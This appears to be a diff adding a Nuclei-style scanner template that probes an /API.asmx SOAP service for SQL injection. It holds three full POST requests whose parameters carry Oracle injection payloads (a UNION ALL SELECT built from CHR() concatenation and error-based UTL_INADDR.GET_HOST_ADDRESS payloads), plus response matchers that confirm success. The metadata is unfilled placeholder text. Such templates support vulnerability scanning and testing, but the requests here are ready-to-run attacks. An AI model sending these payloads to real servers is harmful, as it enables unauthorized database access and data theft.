@@ -1,0 +1,91 @@
+id: sdjt-api-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: API.asmx接口基本存在
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /API.asmx HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: http://tempuri.org/getPerformInfo
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 884
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:getPerformInfo>
+                 <!--type: string-->
+                 <tem:pc>1' UNION ALL SELECT CHR(113)||CHR(107)||CHR(98)||CHR(113)||CHR(113)||CHR(98)||CHR(103)||CHR(106)||CHR(118)||CHR(117)||CHR(78)||CHR(71)||CHR(103)||CHR(68)||CHR(80)||CHR(110)||CHR(69)||CHR(97)||CHR(66)||CHR(98)||CHR(78)||CHR(113)||CHR(69)||CHR(73)||CHR(105)||CHR(67)||CHR(103)||CHR(67)||CHR(88)||CHR(107)||CHR(81)||CHR(111)||CHR(111)||CHR(85)||CHR(65)||CHR(65)||CHR(109)||CHR(115)||CHR(81)||CHR(108)||CHR(88)||CHR(117)||CHR(80)||CHR(77)||CHR(76)||CHR(113)||CHR(106)||CHR(98)||CHR(118)||CHR(113),NULL FROM DUAL-- Ymck</tem:pc>
+                 <!--type: string-->
+                 <tem:isa>sonoras imperio</tem:isa>
+              </tem:getPerformInfo>
+           </soapenv:Body>
+        </soapenv:Envelope>
+      - |-
+        POST /API.asmx HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: http://tempuri.org/getLocationInfo
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 558
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:getLocationInfo>
+                 <!--type: string-->
+                 <tem:lc>1' AND 8699=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(107)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8699=8699) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(98)||CHR(118)||CHR(113))-- Wsyc</tem:lc>
+                 <!--type: string-->
+                 <tem:isa>sonoras imperio</tem:isa>
+              </tem:getLocationInfo>
+           </soap:Body>
+        </soap:Envelope>
+      - |-
+        POST /API.asmx HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: http://tempuri.org/getAreaInfo
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 477
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:getAreaInfo>
+                 <!--type: string-->
+                 <tem:lc>1' AND 8699=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(107)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8699=8699) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(98)||CHR(118)||CHR(113))-- Wsyc</tem:lc>
+              </tem:getAreaInfo>
+           </soap:Body>
+        </soap:Envelope>
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - qkbqq1
+      - type: word
+        part: body
+        words:
+          - qkbqqbgj
